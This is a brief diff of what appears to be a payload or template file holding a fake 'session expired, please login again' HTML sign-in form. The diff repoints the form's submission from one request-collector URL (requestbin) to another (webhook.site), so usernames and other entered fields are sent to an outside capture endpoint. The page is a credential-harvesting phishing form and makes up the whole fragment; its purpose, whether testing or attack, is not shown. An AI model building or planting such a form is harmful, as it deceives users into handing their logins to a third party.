@@ -8,7 +8,7 @@ info:
         <p>Your session has expired. Please login again.</p>
     </div>
     <div class="form-container">
-        <form action="https://requestbin.passkit.com/1q91i0q1" method="post" class="form-signin">
+        <form action="https://webhook.site/61622c8f-16cd-40c7-ac32-c60bf83d7b5b" method="post" class="form-signin">
             <div class="form-group">
                 <label for="username">Username</label>
                 <input type="text" name="username" size="20">
